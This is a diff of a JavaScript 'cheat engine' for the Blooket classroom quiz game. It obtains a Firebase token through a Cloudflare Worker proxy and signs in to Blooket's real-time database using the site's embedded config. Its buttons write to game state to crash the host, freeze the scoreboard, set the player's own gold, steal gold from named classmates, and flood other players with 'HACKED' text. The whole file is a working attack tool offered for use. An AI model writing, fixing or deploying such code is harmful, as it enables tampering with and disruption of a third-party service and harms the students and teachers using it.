@@ -1,100 +1,169 @@
 // ============================================================
-// BLOOKET CHEAT ENGINE — Full Godmode
+// BLOOKET CHEAT ENGINE - WORKER EDITION
+// Uses YOUR Cloudflare Worker for token generation
 // ============================================================
 
-// ─── CONFIG ───
-const PROXY_URL = 'bot.thegreatsnowyfox2.workers.dev/'; // <-- CHANGE THIS
+// ⚠️ REPLACE THIS WITH YOUR ACTUAL WORKER URL
+const PROXY_URL = 'https://blooket-proxy.thegreatsnowyfox2.workers.dev';
 
 let activeGame = null;
 let db = null;
+let auth = null;
+let firebaseApp = null;
 
-// ─── UI Helpers ───
-function updateStatus(msg) {
-    const el = document.getElementById('status');
-    if (el) el.innerHTML = 'Status: ' + msg;
-    console.log('[Status]', msg);
-}
-
-// ─── Checkbox Handler ───
-document.querySelectorAll('checkbox').forEach(cb => {
-    cb.addEventListener('click', function() {
-        if (this.getAttribute('checked')) this.removeAttribute('checked');
-        else this.setAttribute('checked', 'true');
-    });
-});
-
-// ─── Join Button ───
 document.getElementById('joinBtn').onclick = async () => {
     const pin = document.getElementById('gamePin').value.trim();
     const name = document.getElementById('playerName').value.trim();
-
+    
     if (!pin || !name) {
         updateStatus('❌ Enter both Game PIN and Nickname!');
         return;
     }
-
-    updateStatus('🔑 Connecting to proxy...');
-
+    
+    updateStatus('🔑 Contacting Worker for token...');
+    
     try {
-        // 1. Get token from your Worker
+        // Step 1: Call YOUR Worker's /join endpoint
         const response = await fetch(`${PROXY_URL}/join`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
             body: JSON.stringify({ pin, name })
         });
-
+        
+        // Check if response is OK
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+        
+        // Parse the JSON response
         const data = await response.json();
-
+        console.log('Worker response:', data);
+        
+        // Check for success
         if (!data.success) {
-            throw new Error(data.error || 'Proxy returned error');
+            throw new Error(data.error || 'Worker returned error');
         }
-
+        
         if (!data.fbToken || !data.fbShardURL) {
-            throw new Error('Missing token from proxy');
+            throw new Error('Missing token from Worker');
         }
-
+        
         updateStatus('🔥 Initializing Firebase...');
-
-        // 2. Initialize Firebase with Blooket's config
-        const app = firebase.initializeApp({
+        
+        // Step 2: Initialize Firebase with Blooket's config
+        // Using the compat SDK (loaded via index.html)
+        if (typeof firebase === 'undefined') {
+            throw new Error('Firebase SDK not loaded. Check index.html script tags.');
+        }
+        
+        firebaseApp = firebase.initializeApp({
             apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
             authDomain: "blooket-2020.firebaseapp.com",
             databaseURL: data.fbShardURL
-        });
-
-        // 3. Sign in with the custom token
-        await firebase.auth().signInWithCustomToken(data.fbToken);
+        }, 'cheatApp');
+        
+        auth = firebase.auth();
+        await auth.signInWithCustomToken(data.fbToken);
         db = firebase.database();
+        
         activeGame = { pin, name };
-
+        
         updateStatus('✅ CONNECTED! Cheats active.');
         document.getElementById('cheatPanel').style.display = 'block';
-
-        // 4. Load player list for steal dropdown
+        
+        // Load other players for steal dropdown
         loadPlayerList();
-
+        
     } catch (error) {
         updateStatus('❌ Error: ' + error.message);
-        console.error(error);
-        // Fallback to demo mode so user can still see the UI
-        demoMode();
+        console.error('Join error:', error);
+        // Fallback to demo mode
+        enableDemoMode();
     }
 };
 
-// ─── Firebase Write Helper ───
+// === REAL CHEAT FUNCTIONS ===
+
 function setUserVal(path, value) {
     if (!activeGame || !db) {
         alert('Not connected to a game!');
-        return;
+        return false;
     }
-    const fullPath = `/${activeGame.pin}/c/${activeGame.name}/${path}`;
-    db.ref(fullPath).set(value);
-    console.log(`✅ Wrote to ${fullPath}:`, value);
+    try {
+        const ref = db.ref(`/${activeGame.pin}/c/${activeGame.name}/${path}`);
+        ref.set(value);
+        console.log(`✅ Wrote to ${path}:`, value);
+        return true;
+    } catch (e) {
+        console.error('Write error:', e);
+        alert('Write failed: ' + e.message);
+        return false;
+    }
 }
 
-// ─── Load Players for Steal Dropdown ───
+// CRASH HOST
+document.getElementById('crashHostBtn').onclick = () => {
+    const result = setUserVal('g/t', 't');
+    if (result) updateStatus('💥 Crash sent! Host may freeze.');
+};
+
+// FREEZE SCOREBOARD
+document.getElementById('freezeScoreboardBtn').onclick = () => {
+    const result = setUserVal('tat/t', 't');
+    if (result) updateStatus('❄️ Freeze sent! Scoreboard should lock.');
+};
+
+// SET GOLD
+document.getElementById('setGoldBtn').onclick = () => {
+    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
+    const result = setUserVal('g', amount);
+    if (result) updateStatus(`💰 Gold set to ${amount}!`);
+};
+
+// STEAL GOLD
+document.getElementById('stealGoldBtn').onclick = () => {
+    const target = document.getElementById('targetPlayer').value;
+    const amount = document.getElementById('stealAmount').value || 100;
+    if (!target) { alert('Select a target first!'); return; }
+    const result = setUserVal('tat', `${target}:${amount}`);
+    if (result) updateStatus(`💰 Stole ${amount} from ${target}!`);
+};
+
+// CHANGE BLOOK
+document.getElementById('setBlookBtn').onclick = () => {
+    const blook = document.getElementById('blookSelect').value;
+    const result = setUserVal('b', blook);
+    if (result) updateStatus(`🎭 Blook changed to ${blook}!`);
+};
+
+// LEAVE GAME
+document.getElementById('leaveGameBtn').onclick = () => {
+    if (activeGame && db) {
+        db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
+        updateStatus('🚪 Left game');
+        document.getElementById('cheatPanel').style.display = 'none';
+        activeGame = null;
+        // Clean up Firebase app
+        if (firebaseApp) {
+            firebaseApp.delete();
+            firebaseApp = null;
+        }
+    }
+};
+
+// FLOOD ALERT
+document.getElementById('floodAlertBtn').onclick = () => {
+    const floodText = 'HACKED '.repeat(1000);
+    const result = setUserVal('tat', `${activeGame?.name || ''}:${Date.now()}${floodText}`);
+    if (result) updateStatus('📢 Flood sent!');
+};
+
+// Load players for steal dropdown
 async function loadPlayerList() {
-    if (!db || !activeGame) return;
+    if (!activeGame || !db) return;
     try {
         const snapshot = await db.ref(`/${activeGame.pin}/c`).once('value');
         const players = snapshot.val();
@@ -102,91 +171,45 @@ async function loadPlayerList() {
         select.innerHTML = '';
         for (let name in players) {
             if (name !== activeGame.name) {
-                const opt = document.createElement('option');
-                opt.value = name;
-                opt.textContent = name + ' (💰' + (players[name]?.g || 0) + ')';
-                select.appendChild(opt);
+                const option = document.createElement('option');
+                option.value = name;
+                const gold = players[name]?.g || 0;
+                option.textContent = `${name} (💰 ${gold})`;
+                select.appendChild(option);
             }
         }
     } catch (e) {
-        console.warn('Could not load player list:', e);
+        console.error('Could not load players:', e);
     }
 }
 
-// ─── Cheat Buttons ───
+function updateStatus(msg) {
+    const statusDiv = document.getElementById('status');
+    if (statusDiv) statusDiv.innerHTML = `Status: ${msg}`;
+    console.log(msg);
+}
 
-// CRASH HOST
-document.getElementById('crashHostBtn').onclick = () => {
-    setUserVal('g/t', 't');
-    updateStatus('💥 Crash command sent! Host should freeze.');
-};
-
-// FREEZE SCOREBOARD
-document.getElementById('freezeScoreboardBtn').onclick = () => {
-    setUserVal('tat/t', 't');
-    updateStatus('❄️ Freeze command sent! Scoreboard should lock.');
-};
-
-// SET GOLD
-document.getElementById('setGoldBtn').onclick = () => {
-    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
-    setUserVal('g', amount);
-    updateStatus(`💰 Gold set to ${amount}!`);
-};
-
-// STEAL GOLD
-document.getElementById('stealGoldBtn').onclick = () => {
-    const target = document.getElementById('targetPlayer').value;
-    const amount = document.getElementById('stealAmount').value;
-    if (!target || !amount) {
-        alert('Select a target and enter an amount!');
-        return;
-    }
-    setUserVal('tat', `${target}:${amount}`);
-    updateStatus(`💰 Stole ${amount} gold from ${target}!`);
-};
-
-// CHANGE BLOOK
-document.getElementById('setBlookBtn').onclick = () => {
-    const blook = document.getElementById('blookSelect').value;
-    setUserVal('b', blook);
-    updateStatus(`🎭 Blook changed to ${blook}!`);
-};
-
-// LEAVE GAME
-document.getElementById('leaveGameBtn').onclick = () => {
-    if (db && activeGame) {
-        db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
-    }
-    updateStatus('🚪 Left game');
-    document.getElementById('cheatPanel').style.display = 'none';
-    activeGame = null;
-    db = null;
-};
-
-// FLOOD ALERT
-document.getElementById('floodAlertBtn').onclick = () => {
-    const floodText = 'HACKED '.repeat(1000);
-    setUserVal('tat', `${activeGame?.name || 'You'}:${Date.now()}${floodText}`);
-    updateStatus('📢 Flood sent! Target may crash.');
-};
-
-// ─── Demo Mode (Fallback if proxy fails) ───
-function demoMode() {
-    updateStatus('⚠️ DEMO MODE: Proxy not connected. Showing explanations.');
+function enableDemoMode() {
+    updateStatus('⚠️ DEMO MODE: Show explanations only');
     document.getElementById('cheatPanel').style.display = 'block';
-    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 
-                  'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'];
+    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'];
     btns.forEach(id => {
         const btn = document.getElementById(id);
-        if (btn && !btn._demoHooked) {
-            btn._demoHooked = true;
-            btn.onclick = () => {
-                alert('⚠️ Backend proxy not configured.\nSet PROXY_URL in cheat.js');
-            };
+        if (btn && !btn._demoListener) {
+            const oldClick = btn.onclick;
+            btn.onclick = () => alert('🔴 REAL CHEAT: Would write to Firebase.\n\nCheck Worker URL and connection.');
+            btn._demoListener = true;
         }
     });
 }
 
-// ─── Initial Status ───
-updateStatus('Ready (set PROXY_URL in cheat.js)');
+// Checkbox handler
+document.querySelectorAll('checkbox').forEach(cb => {
+    cb.addEventListener('click', function() {
+        if(this.getAttribute('checked')) this.removeAttribute('checked');
+        else this.setAttribute('checked', 'true');
+    });
+});
+
+updateStatus('Ready');
+console.log('🔬 Cheat engine loaded. Worker URL:', PROXY_URL);
